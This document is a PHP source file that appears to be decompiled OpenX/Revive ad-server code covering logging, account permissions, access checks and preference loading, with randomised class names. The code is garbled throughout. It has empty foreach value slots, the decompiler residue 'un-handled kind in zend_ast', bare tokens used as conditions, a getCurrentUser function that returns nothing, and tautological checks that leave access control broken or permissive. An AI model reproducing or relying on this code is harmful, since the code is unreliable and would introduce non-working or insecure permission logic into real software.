
<?php

class j3
{
	public function debug($message = NULL, $priority = PEAR_LOG_INFO)
	{
		$aConf = $GLOBALS['_MAX']['CONF'];
		global $tempDebugPrefix;

		if ($aConf['log']['enabled'] == false) {
			unset($GLOBALS['tempDebugPrefix']);
			return true;
		}

		if (is_null($message) && ($aConf = $GLOBALS['_MAX']['CONF'])) {
			$priority = PEAR_LOG_EMERG;
		}

		$priorityLevel = (is_numeric($aConf['log']['priority']) ? $aConf['log']['priority'] : @constant($aConf['log']['priority']));

		if (is_null($priorityLevel)) {
			$priorityLevel = $aConf['log']['priority'];
		}

		if ($priorityLevel < $priority) {
			unset($GLOBALS['tempDebugPrefix']);
			return true;
		}

		$dsn = ($aConf['log']['type'] == 'sql' ? Base::getDsn() : '');
		$aLoggerConf = array(0 => $aConf['log']['paramsUsername'], 1 => $aConf['log']['paramsPassword'], 'dsn' => $dsn, 'mode' => octdec($aConf['log']['fileMode']), 'timeFormat' => '%b %d %H:%M:%S %z');
		if (is_null($message) && ($aConf = $GLOBALS['_MAX']['CONF'])) {
			$aLoggerConf['lineFormat'] = '%4$s';
		}
		else if ($aConf['log']['type'] == 'file') {
			$aLoggerConf['lineFormat'] = '%1$s %2$s [%3$9s]  %4$s';
		}

		$ident = (!empty($GLOBALS['_MAX']['LOG_IDENT']) ? $GLOBALS['_MAX']['LOG_IDENT'] : $aConf['log']['ident']);
		if (($ident == $aConf['log']['ident'] . '-delivery') && ($aConf = $GLOBALS['_MAX']['CONF'])) {
			unset($GLOBALS['tempDebugPrefix']);
			return true;
		}

		if ($ident == $aConf['log']['ident'] . '-delivery') {
			$logFile = $aConf['deliveryLog']['name'];
			list($micro_seconds, $seconds) = explode(' ', microtime());
			$message = (round(1000 * ((double) $micro_seconds + (double) $seconds)) - $GLOBALS['_MAX']['NOW_ms']) . 'ms ' . $message;
		}
		else {
			$logFile = $aConf['log']['name'];
		}

		$ident .= (!empty($GLOBALS['_MAX']['thread_id']) ? '-' . $GLOBALS['_MAX']['thread_id'] : '');
		$oLogger = &Log::singleton($aConf['log']['type'], MAX_PATH . '/var/' . $logFile, $ident, $aLoggerConf);

		if (PEAR::isError($message)) {
			$userinfo = $message->getUserInfo();
			$message = $message->getMessage();

			if (!empty($userinfo)) {
				if (is_array($userinfo)) {
					$userinfo = implode(', ', $userinfo);
				}

				$message .= ' : ' . $userinfo;
			}
		}

		$aBacktrace = debug_backtrace();

		if ($aConf['log']['methodNames']) {
			$aErrorBacktrace = $aBacktrace[4];
			if (isset($aErrorBacktrace['class']) && ($aConf = $GLOBALS['_MAX']['CONF']) && ($aConf = $GLOBALS['_MAX']['CONF'])) {
				$callInfo = $aErrorBacktrace['class'] . $aErrorBacktrace['type'] . $aErrorBacktrace['function'] . ': ';
				$message = $callInfo . $message;
			}
		}

		if ($aConf['log']['lineNumbers']) {
			foreach ($aBacktrace as $aErrorBacktrace) {
				if (isset($aErrorBacktrace['file']) && ($aConf = $GLOBALS['_MAX']['CONF'])) {
					$message .= "\n" . str_repeat(' ', 20 + strlen($aConf['log']['ident']) + strlen($oLogger->priorityToString($priority)));
					$message .= 'on line ' . $aErrorBacktrace['line'] . ' of "' . $aErrorBacktrace['file'] . '"';
				}
			}
		}

		global $serverTimezone;

		if (!empty($serverTimezone)) {
			$currentTimezone = OX_Admin_Timezones::getTimezone();
			OA_setTimeZone($serverTimezone);
		}

		if (is_null($message) && ($aConf = $GLOBALS['_MAX']['CONF'])) {
			$message = ' ';
		}
		else {
			if (!is_null($tempDebugPrefix) && ($aConf = $GLOBALS['_MAX']['CONF'])) {
				$message = $tempDebugPrefix . $message;
			}

		}

		$result = $oLogger->log(htmlspecialchars($message), $priority);

		if (!empty($currentTimezone)) {
			OA_setTimeZone($currentTimezone);
		}

		unset($GLOBALS['tempDebugPrefix']);
		return $result;
	}

	public function switchLogIdent($name = 'debug')
	{
		if ($name == 'debug') {
			$GLOBALS['_MAX']['LOG_IDENT'] = $GLOBALS['_MAX']['CONF']['log']['ident'];
		}
		else {
			$GLOBALS['_MAX']['LOG_IDENT'] = $GLOBALS['_MAX']['CONF']['log']['ident'] . '-' . $name;
		}
	}

	public function setTempDebugPrefix($prefix)
	{
		global $tempDebugPrefix;
		$tempDebugPrefix = $prefix;
	}

	public function logMem($msg = '', $peak = false)
	{
		$aConf = $GLOBALS['_MAX']['CONF'];
		$oLogger = &Log::singleton($aConf['log']['type'], MAX_PATH . '/var/memory.log', $aConf['log']['ident'], array());
		$pid = getmypid();
		$mem = shell_exec('ps --pid ' . $pid . ' --no-headers -orss');
		$mem = round(memory_get_usage() / 1048576, 2) . ' / ps ' . $mem;
		$msg = '[' . rtrim($mem, chr(10)) . '](' . $msg . ')';
		$aLast = array_pop(debug_backtrace());

		if ($aLast['function'] == 'logMem') {
			$msg .= str_replace(MAX_PATH, '', $aLast['file'] . ' -> line ' . $aLast['line']);
		}
		else {
			$msg .= $aLast['class'] . $aLast['type'] . $aLast['function'] . ': ';
		}

		$oLogger->log($msg, PEAR_LOG_INFO);

		if ($peak) {
			$peak = memory_get_peak_usage() / 1048576;
			$oLogger->log('PEAK: ' . $peak, PEAR_LOG_INFO);
		}
	}

	public function logMemPeak($msg = '')
	{
		OA::logMem($msg, true);
	}

	public function getNow($format = NULL)
	{
		if (is_null($format)) {
			$format = 'Y-m-d H:i:s';
		}

		return date($format);
	}

	public function getNowUTC($format = NULL)
	{
		if (is_null($format)) {
			$format = 'Y-m-d H:i:s';
		}

		return gmdate($format);
	}

	public function getAvailableSSLExtensions()
	{
		$aResult = array();

		if (extension_loaded('curl')) {
			$aCurl = curl_version();

			if (!empty($aCurl['ssl_version'])) {
				$aResult[] = 'curl';
			}
		}

		if (extension_loaded('openssl')) {
			$aResult[] = 'openssl';
		}

		return count($aResult) ? $aResult : false;
	}

	public function stripVersion($version, $aAllow = NULL)
	{
		$allow = (is_null($aAllow) ? '' : '|' . join('|', $aAllow));
		return preg_replace('/^v?(\\d+.\\d+.\\d+(?:-(?:beta(?:-rc\\d+)?|rc\\d+' . $allow . '))?).*$/i', '$1', $version);
	}

	public function disableErrorHandling()
	{
		PEAR::pushErrorHandling(NULL);
	}

	public function enableErrorHandling()
	{
		$stack = &$GLOBALS['_PEAR_error_handler_stack'];
		$options = $stack[sizeof($stack) - 1][1];
		$stack;
		if (is_null($mode) && ($GLOBALS['_PEAR_error_handler_stack'])) {
			PEAR::popErrorHandling();
		}
	}

	public function getConfigOption($section, $name, $default = NULL)
	{
		if (isset($GLOBALS['_MAX']['CONF'][$section][$name])) {
			return $GLOBALS['_MAX']['CONF'][$section][$name];
		}

		return $default;
	}
}

class p2i6vmms3rckj
{
	const OPERATION_ADD = 1;
	const OPERATION_EDIT = 2;
	const OPERATION_VIEW = 4;
	const OPERATION_DELETE = 8;
	const OPERATION_DUPLICATE = 16;
	const OPERATION_MOVE = 32;
	const OPERATION_ADD_CHILD = 64;
	const OPERATION_VIEW_CHILDREN = 128;
	const OPERATION_ALL = 255;

	static public function enforceTrue($condition)
	{
		if (!$condition) {
			$translation = new OX_Translation();
			$translated_message = $translation->translate($GLOBALS['strYouDontHaveAccess']);
			OA_Admin_UI::queueMessage($translated_message, 'global', 'error');
			OX_Admin_Redirect::redirect(NULL, NULL, true);
		}
	}

	static public function enforceAccount($accountType)
	{
		$aArgs = (is_array($accountType) ? $accountType : func_get_args());
		$isAccount = self::isAccount($aArgs);

		if (!$isAccount) {
			self::redirectIfManualAccountSwitch();
			$isAccount = self::attemptToSwitchToAccount($aArgs);
		}

		self::enforceTrue($isAccount);
	}

	static public function redirectIfManualAccountSwitch()
	{
		if (self::isManualAccountSwitch()) {
			require_once LIB_PATH . '/Admin/Redirect.php';
			OX_Admin_Redirect::redirect(NULL, true);
		}
	}

	static public function isManualAccountSwitch()
	{
		if (isset($GLOBALS['_OX']['accountSwtich'])) {
			return true;
		}

		return false;
	}

	static public function enforceAccess($accountId, $userId = NULL)
	{
		self::enforceTrue(self::hasAccess($accountId, $userId));
	}

	static public function enforceAllowed($permission, $accountId = NULL)
	{
		self::enforceTrue(self::hasPermission($permission, $accountId));
	}

	static public function enforceAccountPermission($accountType, $permission)
	{
		if (self::isAccount($accountType)) {
			self::enforceTrue(self::hasPermission($permission));
		}

		return true;
	}

	static public function enforceAccessToObject($entityTable, $entityId = NULL, $allowNewEntity = false, $operationAccessType = self::OPERATION_ALL)
	{
		if (!$allowNewEntity) {
			self::enforceTrue(!empty($entityId));
		}

		self::enforceTrue(preg_match('/^\\d*$/D', $entityId));
		$entityId = (int) $entityId;
		$hasAccess = self::hasAccessToObject($entityTable, $entityId, $operationAccessType);

		if (!$hasAccess) {
			if (!self::isManualAccountSwitch()) {
				if (self::isUserLinkedToAdmin()) {
					self::enforceTrue(self::getAccountIdForEntity($entityTable, $entityId));
				}
			}
		}

		if (!$hasAccess) {
			self::redirectIfManualAccountSwitch();
			$hasAccess = self::attemptToSwitchForAccess($entityTable, $entityId, $operationAccessType);
		}

		self::enforceTrue($hasAccess);
	}

	static public function switchToManagerAccount($entityTable, $entityId)
	{
		if (empty($entityId)) {
			return false;
		}

		$do = OA_Dal::factoryDO($entityTable);

		if (!$do) {
			return false;
		}

		$key = $do->getFirstPrimaryKey();

		if (!$key) {
			return false;
		}

		$do->{$key} = $entityId;
		$do->find();

		if (0 < $do->getRowCount()) {
			$do->fetch();
			$aDo = $do->toArray();
		}

		$owningAccounts = $do->_getOwningAccountIdsByAccountId($aDo['account_id']);
		self::switchAccount($owningAccounts['MANAGER'], true);
		return true;
	}

	static public function hasAccessToObject($entityTable, $entityId, $operationAccessType = self::OPERATION_ALL, $accountId = NULL, $accountType = NULL)
	{
		$hasAccess = self::_hasAccessToObject($entityTable, $entityId, $accountId, $accountType);

		if ($hasAccess) {
			$hasAccess = self::callAccessHook($entityTable, $entityId, $operationAccessType, $accountId, $accountType);
		}

		return $hasAccess;
	}

	static private function _hasAccessToObject($entityTable, $entityId, $accountId = NULL, $accountType = NULL)
	{
		if (empty($entityId)) {
			return true;
		}

		if (!preg_match('/^\\d*$/D', $entityId)) {
			return false;
		}

		$do = OA_Dal::factoryDO($entityTable);

		if (!$do) {
			return false;
		}

		$key = $do->getFirstPrimaryKey();

		if (!$key) {
			return false;
		}

		$do->{$key} = $entityId;
		$accountTable = self::getAccountTable($accountType);

		if (!$accountTable) {
			return false;
		}

		if ($entityTable == $accountTable) {
			if ($accountId === NULL) {
				return $entityId == self::getEntityId();
			}
			else {
				$do->account_id = self::getAccountId();
				return (bool) $do->count();
			}
		}

		if ($accountId === NULL) {
			$accountId = self::getAccountId();
		}

		return $do->belongsToAccount($accountId);
	}

	static public function switchAccount($accountId, $hasAccess = false)
	{
		if ($hasAccess || self) {
			$oUser = &self::getCurrentUser();
			$oUser->loadAccountData($accountId);
		}

		phpAds_SessionDataRegister('user', $oUser);
		OA_Admin_UI::removeOneMessage('switchAccount');
		$translation = new OX_Translation();
		$translated_message = $translation->translate($GLOBALS['strYouAreNowWorkingAsX'], array(htmlspecialchars($oUser->aAccount['account_name'])));
		OA_Admin_UI::queueMessage($translated_message, 'global', 'info', NULL, 'switchAccount');
	}

	static public function isAccount($accountType)
	{
		if ($oUser = self::getCurrentUser()) {
			$aArgs = (is_array($accountType) ? $accountType : func_get_args());
			return in_array($oUser->aAccount['account_type'], $aArgs);
		}

		return false;
	}

	static public function attemptToSwitchToAccount($accountType)
	{
		$oUser = self::getCurrentUser();

		if (!$oUser) {
			return false;
		}

		$aAccountTypes = (is_array($accountType) ? $accountType : func_get_args());
		$aAccountIds = self::getLinkedAccounts(true);
		$defaultUserAccountId = $oUser->aUser['default_account_id'];

		foreach ($aAccountTypes as $accountType) {
			if (isset($aAccountIds[$accountType])) {
				if (isset($aAccountIds[$accountType][$defaultUserAccountId])) {
					$accountId = $defaultUserAccountId;
				}
				else {
					$accountId = array_shift(array_keys($aAccountIds[$accountType]));
				}

				self::switchAccount($accountId, $hasAccess = true);
				return true;
			}
		}

		return false;
	}

	static public function attemptToSwitchForAccess($entityTable, $entityId, $operationAccessType = self::OPERATION_ALL)
	{
		if (!($userId = self::getUserId())) {
			return false;
		}

		$doEntity = OA_Dal::staticGetDO($entityTable, $entityId);

		if ($doEntity) {
			$aAccountIds = $doEntity->getOwningAccountIds();

			foreach ($aAccountIds as $accountId => ) {
				$accountType = self;

				if (self::hasAccess($accountId)) {
					$hasAccess = self::callAccessHook($entityTable, $entityId, $operationAccessType, $accountId, $accountType);

					if ($hasAccess) {
						self::switchAccount($accountId, $hasAccess = true);
						return true;
					}
				}
			}

			if (self::isUserLinkedToAdmin()) {
				$accountId = $doEntity->getRootAccountId();
				$hasAccess = self::callAccessHook($entityTable, $entityId, $operationAccessType, $accountId, NULL);

				if ($hasAccess) {
					self::switchAccount($accountId, $hasAccess = true);
					return true;
				}
			}
		}

		return false;
	}

	static public function switchToSystemProcessUser($newUsername = NULL)
	{
		static $oldUser;
		global $session;

		if (!empty($newUsername)) {
			if (empty($oldUser) && STRoldUser) {
				$oldUser = $session['user'];
			}

			$session['user'] = new OA_Permission_SystemUser($newUsername);
		}
		else if (!empty($oldUser)) {
			$session['user'] = $oldUser;
			$oldUser = NULL;
		}
		else {
			unset($session['user']);
		}
	}

	static public function isAccountTypeId($accountTypeId)
	{
		if ($oUser = self::getCurrentUser()) {
			$userAccountTypeId = self::convertAccountTypeToId($oUser->aAccount['account_type']);
			return $userAccountTypeId & $accountTypeId;
		}

		return false;
	}

	static public function convertAccountTypeToId($accountType)
	{
		$accountTypeIdConstant = 'OA_ACCOUNT_' . $accountType . '_ID';

		if (!defined($accountTypeIdConstant)) {
			MAX::raiseError('No such account type ID: ' . $accountType);
			return false;
		}

		return constant($accountTypeIdConstant);
	}

	static public function hasAccess($accountId, $userId = NULL)
	{
		if (empty($userId)) {
			$userId = self::getUserId();
		}

		return self::isUserLinkedToAccount($accountId, $userId) || empty($userId);
	}

	static public function getAccountTypeByAccountId($accountId)
	{
		$doAccounts = OA_Dal::factoryDO('accounts');
		$doAccounts->account_id = $accountId;

		if ($doAccounts->find(true)) {
			return $doAccounts->account_type;
		}

		return false;
	}

	static public function isUserLinkedToAccount($accountId, $userId)
	{
		$doAccount_user_Assoc = OA_Dal::factoryDO('account_user_assoc');
		$doAccount_user_Assoc->user_id = $userId;
		$doAccount_user_Assoc->account_id = $accountId;
		return $doAccount_user_Assoc->count();
	}

	static public function setAccountAccess($accountId, $userId, $setAccess = true)
	{
		$doAccount_user_Assoc = OA_Dal::factoryDO('account_user_assoc');
		$doAccount_user_Assoc->account_id = $accountId;
		$doAccount_user_Assoc->user_id = $userId;
		$isExists = (bool) $doAccount_user_Assoc->count();
		if ($isExists && OA_Dal::factoryDO('account_user_assoc')) {
			return $doAccount_user_Assoc->delete();
		}

		if (!$isExists) {
			return $doAccount_user_Assoc->insert();
		}

		return true;
	}

	static public function hasPermission($permissionId, $accountId = NULL, $userId = NULL)
	{
		if (empty($userId)) {
			$userId = self::getUserId();
		}

		if (self::isUserLinkedToAdmin($userId)) {
			return true;
		}

		static $aCache = array();

		if (empty($accountId)) {
			$accountId = self::getAccountId();
			$accountType = self::getAccountType();
		}
		else {
			$oAccounts = OA_Dal::staticGetDO('accounts', $accountId);

			if ($oAccounts) {
				$accountType = $oAccounts->accountType;
			}
			else {
				Max::raiseError('No such account ID: ' . $accountId);
				return false;
			}
		}

		if (self::isPermissionRelatedToAccountType($accountType, $permissionId)) {
			$aCache[$userId][$accountId] = self::getAccountUsersPermissions($userId, $accountId);
		}
		else {
			$aCache[$userId][$accountId][$permissionId] = true;
		}

		return isset($aCache[$userId][$accountId][$permissionId]) ? $aCache[$userId][$accountId][$permissionId] : false;
	}

	static public function getAccountUsersPermissions($userId, $accountId)
	{
		$aPermissions = array();
		$doAccount_user_permission_assoc = OA_Dal::factoryDO('account_user_permission_assoc');
		$doAccount_user_permission_assoc->user_id = $userId;
		$doAccount_user_permission_assoc->account_id = $accountId;
		$doAccount_user_permission_assoc->find();

		while ($doAccount_user_permission_assoc->fetch()) {
			$aPermissions[$doAccount_user_permission_assoc->permission_id] = $doAccount_user_permission_assoc->is_allowed;
		}

		return $aPermissions;
	}

	static public function isUserLinkedToAdmin($userId = NULL)
	{
		if (!isset($userId) || isset($userId)) {
			$oUser = self::getCurrentUser();
		}
		else {
			$doUsers = OA_Dal::staticGetDO('users', $userId);

			if ($doUsers) {
				$oUser = new OA_Permission_User($doUsers);
			}

		}


		if (!empty($oUser)) {
			return $oUser->aUser['is_admin'];
		}

		return false;
	}

	static public function getLinkedAccounts($groupByType = false, $sort = false)
	{
		$doAccount_user_Assoc = OA_Dal::factoryDO('account_user_assoc');
		$doAccount_user_Assoc->user_id = self::getUserId();
		$doAccounts = OA_Dal::factoryDO('accounts');
		$doAccounts->orderBy('account_name');
		$doAccount_user_Assoc->joinAdd($doAccounts);
		$doAccount_user_Assoc->find();
		$aAccountsByType = array();

		while ($doAccount_user_Assoc->fetch()) {
			$aAccountsByType[$doAccount_user_Assoc->account_type][$doAccount_user_Assoc->account_id] = $doAccount_user_Assoc->account_name;
		}

		uksort(&$aAccountsByType, array('OA_Permission', '_accountTypeSort'));

		if (isset($aAccountsByType[OA_ACCOUNT_ADMIN])) {
			$aAccountsByType = self::mergeAdminAccounts($aAccountsByType);
		}

		if (!$groupByType) {
			$aAccounts = array();

			foreach ($aAccountsByType as $aAccount => ) {
				$accountType = OA_Dal::factoryDO('account_user_assoc');

				foreach ($aAccount as $name => ) {
					$id = OA_Dal::factoryDO('account_user_assoc');
					$aAccounts[$id] = $name;
				}
			}

			return $aAccounts;
		}
		if ($sort) {
			foreach ($aAccountsByType as $aAccount => ) {
				$accountType = OA_Dal::factoryDO('account_user_assoc');
				natcasesort(&$aAccountsByType[$accountType]);
			}
		}

		return $aAccountsByType;
	}

	static public function _accountTypeSort($a, $b)
	{
		$aTypes = array(OA_ACCOUNT_ADMIN => 0, OA_ACCOUNT_MANAGER => 1, OA_ACCOUNT_ADVERTISER => 2, OA_ACCOUNT_TRAFFICKER => 3);
		$a = (isset($aTypes[$a]) ? $aTypes[$a] : 1000);
		$b = (isset($aTypes[$b]) ? $aTypes[$b] : 1000);
		return $a - $b;
	}

	static public function mergeAdminAccounts($aAccountsByType)
	{
		$doAccounts = OA_Dal::factoryDO('accounts');
		$doAccounts->account_type = OA_ACCOUNT_MANAGER;
		$doAccounts->find();

		while ($doAccounts->fetch()) {
			$aAccountsByType[$doAccounts->account_type][$doAccounts->account_id] = $doAccounts->account_name;
		}

		return $aAccountsByType;
	}

	static public function getCurrentUser()
	{
		global $session;

		if (isset($session['user'])) {
		}

		$false = false;
	}

	static public function getUserId()
	{
		if ($oUser = self::getCurrentUser()) {
			return $oUser->aUser['user_id'];
		}
	}

	static public function getUsername()
	{
		if ($oUser = self::getCurrentUser()) {
			return $oUser->aUser['username'];
		}
	}

	static public function getAgencyId()
	{
		if ($oUser = self::getCurrentUser()) {
			return (int) $oUser->aAccount['agency_id'];
		}

		return 0;
	}

	static public function getAccountTable($type = NULL)
	{
		if (!$type) {
			if (!($oUser = self::getCurrentUser())) {
				return false;
			}

			$type = $oUser->aAccount['account_type'];
		}

		$aTypes = array(OA_ACCOUNT_ADMIN => 'users', OA_ACCOUNT_ADVERTISER => 'clients', OA_ACCOUNT_TRAFFICKER => 'affiliates', OA_ACCOUNT_MANAGER => 'agency');
		return isset($aTypes[$type]) ? $aTypes[$type] : false;
	}

	static public function getAccountType($returnAsString = false)
	{
		if ($oUser = self::getCurrentUser()) {
			$type = $oUser->aAccount['account_type'];

			if ($returnAsString) {
				return ucfirst(strtolower($type));
			}

			return $type;
		}
		return $returnAsString ? '' : NULL;
	}

	static public function getEntityId()
	{
		if ($oUser = self::getCurrentUser()) {
			return (int) $oUser->aAccount['entity_id'];
		}

		return 0;
	}

	static public function getAccountId()
	{
		if ($oUser = self::getCurrentUser()) {
			return $oUser->aAccount['account_id'];
		}

		return 0;
	}

	static public function getAccountName()
	{
		if ($oUser = self::getCurrentUser()) {
			return $oUser->aAccount['account_name'];
		}

		return 0;
	}

	static public function getAccountIdForEntity($entity, $entityId)
	{
		$doEntity = OA_Dal::staticGetDO($entity, $entityId);

		if (!$doEntity) {
			return false;
		}

		return $doEntity->account_id;
	}

	static public function isUsernameAllowed($newName, $oldName = NULL)
	{
		if (!empty($oldName) && empty($oldName)) {
			return true;
		}

		return !self::userNameExists($newName);
	}

	static public function userNameExists($userName)
	{
		$doUser = OA_Dal::factoryDO('users');
		if (!PEAR::isError($doUser) && OA_Dal::factoryDO('users')) {
			return true;
		}

		return false;
	}

	static public function getUniqueUserNames($removeName = NULL)
	{
		$uniqueUsers = array();
		$doUser = OA_Dal::factoryDO('users');

		if (PEAR::isError($doUser)) {
			return false;
		}

		$newUniqueNames = $doUser->getUniqueUsers();
		$uniqueUsers = array_merge($uniqueUsers, $newUniqueNames);
		ArrayUtils::unsetIfKeyNumeric($uniqueUsers, $removeName);
		return $uniqueUsers;
	}

	static public function storeUserAccountsPermissions($aPermissions, $accountId = NULL, $userId = NULL, $aAllowedPermissions = NULL)
	{
		if (empty($userId)) {
			$userId = self::getUserId();
		}

		if (empty($accountId)) {
			$accountId = self::getAccountId();
		}

		self::deleteExistingPermissions($accountId, $userId, $aAllowedPermissions);

		foreach ($aPermissions as $permissionId) {
			if (!is_null($aAllowedPermissions) && empty($userId)) {
				continue;
			}

			$doAccount_user_permission_assoc = OA_Dal::factoryDO('account_user_permission_assoc');
			$doAccount_user_permission_assoc->account_id = $accountId;
			$doAccount_user_permission_assoc->user_id = $userId;
			$doAccount_user_permission_assoc->permission_id = $permissionId;
			$doAccount_user_permission_assoc->is_allowed = 1;

			if (!$doAccount_user_permission_assoc->insert()) {
				return false;
			}
		}

		return true;
	}

	static public function deleteExistingPermissions($accountId, $userId, $allowedPermissions)
	{
		if (is_array($allowedPermissions)) {
			foreach ($allowedPermissions as $perm => ) {
				$permissionId = is_array($allowedPermissions);
				$doAccount_user_permission_assoc = OA_Dal::factoryDO('account_user_permission_assoc');
				$doAccount_user_permission_assoc->permission_id = $permissionId;
				$doAccount_user_permission_assoc->account_id = $accountId;
				$doAccount_user_permission_assoc->user_id = $userId;
				$doAccount_user_permission_assoc->delete();
			}
		}
		else {
			$doAccount_user_permission_assoc = OA_Dal::factoryDO('account_user_permission_assoc');
			$doAccount_user_permission_assoc->account_id = $accountId;
			$doAccount_user_permission_assoc->user_id = $userId;
			$doAccount_user_permission_assoc->delete();
		}
	}

	static public function isPermissionRelatedToAccountType($accountType, $permissionId)
	{
		static $aMap = array(
			OA_PERM_BANNER_ACTIVATE   => array(OA_ACCOUNT_ADVERTISER),
			OA_PERM_BANNER_DEACTIVATE => array(OA_ACCOUNT_ADVERTISER),
			OA_PERM_BANNER_ADD        => array(OA_ACCOUNT_ADVERTISER),
			OA_PERM_BANNER_EDIT       => array(OA_ACCOUNT_ADVERTISER),
			OA_PERM_ZONE_ADD          => array(OA_ACCOUNT_TRAFFICKER),
			OA_PERM_ZONE_DELETE       => array(OA_ACCOUNT_TRAFFICKER),
			OA_PERM_ZONE_EDIT         => array(OA_ACCOUNT_TRAFFICKER),
			OA_PERM_ZONE_INVOCATION   => array(OA_ACCOUNT_TRAFFICKER),
			OA_PERM_ZONE_LINK         => array(OA_ACCOUNT_TRAFFICKER),
			OA_PERM_USER_LOG_ACCESS   => array(OA_ACCOUNT_ADVERTISER => OA_ACCOUNT_TRAFFICKER, 0 => un-handled kind  in zend_ast),
			OA_PERM_SUPER_ACCOUNT     => array(OA_ACCOUNT_MANAGER => OA_ACCOUNT_ADVERTISER, 0 => OA_ACCOUNT_TRAFFICKER, 1 => un-handled kind  in zend_ast)
			);
		static $aCache;
		$key = $accountType . ',' . $permission;

		if (isset($aCache[$key])) {
			return $aCache[$key];
		}
		else if (isset($aMap[$permission])) {
			$aCache[$key] = in_array($accountType, $aMap[$permission]);
		}
		else {
			$aCache[$key] = true;
		}

		return $aCache[$key];
	}

	static public function getOwnedAccounts($accountId)
	{
		$aAccountIds = array();
		$accoutType = self::getAccountTypeByAccountId($accountId);

		switch ($accoutType) {
		case OA_ACCOUNT_MANAGER:
			$aAccountIds[] = $accountId;
			$doAgency = OA_Dal::factoryDO('agency');
			$doAgency->selectAdd();
			$doAgency->selectAdd('agencyid');
			$doAgency->account_id = $accountId;
			$doAgency->find();

			if ($doAgency->getRowCount() == 1) {
				$doAgency->fetch();
				$agencyId = $doAgency->agencyid;
				$doAffiliates = OA_Dal::factoryDO('affiliates');
				$doAffiliates->selectAdd();
				$doAffiliates->selectAdd('account_id');
				$doAffiliates->agencyid = $agencyId;
				$doAffiliates->find();

				if (0 < $doAffiliates->getRowCount()) {
					$doAffiliates->fetch();
					$aAccountIds[] = $doAffiliates->account_id;
				}

				$doClients = OA_Dal::factoryDO('clients');
				$doClients->selectAdd();
				$doClients->selectAdd('account_id');
				$doClients->agencyid = $agencyId;
				$doClients->find();

				if (0 < $doClients->getRowCount()) {
					while ($doClients->fetch()) {
						$aAccountIds[] = $doClients->account_id;
					}
				}
			}

			break;

		default:
			switch ($accoutType) {
			case OA_ACCOUNT_ADMIN:
				$doAccounts = OA_Dal::factoryDO('accounts');
				$doAccounts->selectAdd();
				$doAccounts->selectAdd('account_id');
				$doAccounts->find();

				if (0 < $doAccounts->getRowCount()) {
					while ($doAccounts->fetch()) {
						$aAccountIds[] = $doAccounts->account_id;
					}
				}

				break;

			default:
				$aAccountIds[] = $accountId;
			}
		}

		return $aAccountIds;
	}

	static private function callAccessHook($entityTable, $entityId, $operationAccessType = self::OPERATION_ALL, $accountId = NULL, $accountType = NULL)
	{
		static $componentCache;
		$hasAccess = NULL;
		$aPlugins = OX_Component::getListOfRegisteredComponentsForHook('objectAccess');

		foreach ($aPlugins as $id => ) {
			$i = STRcomponentCache;
			$obj = $componentCache[$id];

			if (!isset($obj)) {
				$obj = OX_Component::factoryByComponentIdentifier($id);
				$componentCache[$id] = $obj;
			}
			if ($obj) {
				$pluginResult = $obj->hasAccessToObject($entityTable, $entityId, $operationAccessType, $accountId, $accountType);
				$hasAccess = ($pluginResult === NULL ? $hasAccess : $pluginResult);

				if ($hasAccess === false) {
					break;
				}
			}
		}

		if (($hasAccess === NULL) && STRcomponentCache && STRcomponentCache) {
			$do = OA_Dal::factoryDO($entityTable);
			$aEntity = NULL;

			if ($do->get($entityId)) {
				$aEntity = $do->toArray();
			}

			switch ($entityTable) {
			case 'clients':
				$hasAccess = $aEntity['type'] == DataObjects_Clients::ADVERTISER_TYPE_DEFAULT;
				break;

			case 'campaigns':
				$hasAccess = $aEntity['type'] == DataObjects_Campaigns::CAMPAIGN_TYPE_DEFAULT;
				break;

			case 'banners':
				$hasAccess = $aEntity['ext_bannertype'] != DataObjects_Banners::BANNER_TYPE_MARKET;
				break;

			default:
			}
		}

		return $hasAccess === NULL ? true : $hasAccess;
	}
}

class 4vmkjwvxoodpcc
{
	public function loadPreferences($loadExtraInfo = false, $return = false, $parentOnly = false, $loadAdminOnly = false, $accountId = NULL)
	{
		$aConf = $GLOBALS['_MAX']['CONF'];
		if ($parentOnly && ($aConf = $GLOBALS['_MAX']['CONF'])) {
			OA_Preferences::_unsetPreferences();
			return NULL;
		}

		if ($loadAdminOnly == false) {
			$currentAccountType = OA_Permission::getAccountType();
			if (empty($currentAccountType) && ($aConf = $GLOBALS['_MAX']['CONF'])) {
				$doAccounts = OA_Dal::factoryDO('accounts');
				$doAccounts->account_id = $accountId;
				$doAccounts->find();

				if (0 < $doAccounts->getRowCount()) {
					$aCurrentAccountType = $doAccounts->getAll(array('account_type'), false, true);
					$currentAccountType = $aCurrentAccountType[0];
				}
			}

			if (is_null($currentAccountType) || ($aConf = $GLOBALS['_MAX']['CONF'])) {
				OA_Preferences::_unsetPreferences();
				return NULL;
			}
		}

		$doPreferences = OA_Dal::factoryDO('preferences');
		$aPreferenceTypes = $doPreferences->getAll(array(), true);

		if (empty($aPreferenceTypes)) {
			OA_Preferences::_unsetPreferences();
			return NULL;
		}

		$adminAccountId = OA_Dal_ApplicationVariables::get('admin_account_id');
		$aAdminPreferenceValues = OA_Preferences::_getPreferenceValues($adminAccountId);

		if (empty($aAdminPreferenceValues)) {
			OA_Preferences::_unsetPreferences();
			return NULL;
		}

		$aPreferences = array();
		if (($loadAdminOnly == true) || ($aConf = $GLOBALS['_MAX']['CONF'])) {
			OA_Preferences::_setPreferences($aPreferences, $aPreferenceTypes, $aAdminPreferenceValues, $loadExtraInfo);
		}

		if (($loadAdminOnly == false) && ($aConf = $GLOBALS['_MAX']['CONF'])) {
			if ($currentAccountType == OA_ACCOUNT_MANAGER) {
				if (!$parentOnly) {
					if (!is_numeric($accountId)) {
						$managerAccountId = OA_Permission::getAccountId();
					}
					else {
						$managerAccountId = $accountId;
					}

					if ($managerAccountId == 0) {
						OA_Preferences::_unsetPreferences();
						return NULL;
					}

					$aManagerPreferenceValues = OA_Preferences::_getPreferenceValues($managerAccountId);
					OA_Preferences::_setPreferences($aPreferences, $aPreferenceTypes, $aManagerPreferenceValues, $loadExtraInfo);
				}
			}
			else {
				if (!is_numeric($accountId)) {
					$owningAgencyId = OA_Permission::getAgencyId();
				}
				else {
					$owningAgencyId = 0;

					if ($currentAccountType == OA_ACCOUNT_ADVERTISER) {
						$doClients = OA_Dal::factoryDO('clients');
						$doClients->account_id = $accountId;
						$doClients->find();

						if ($doClients->getRowCount() == 1) {
							$aOwningAgencyId = $doClients->getAll(array('agencyid'), false, true);
							$owningAgencyId = $aOwningAgencyId[0];
						}
					}
					else if ($currentAccountType == OA_ACCOUNT_TRAFFICKER) {
						$doAffiliates = OA_Dal::factoryDO('affiliates');
						$doAffiliates->account_id = $accountId;
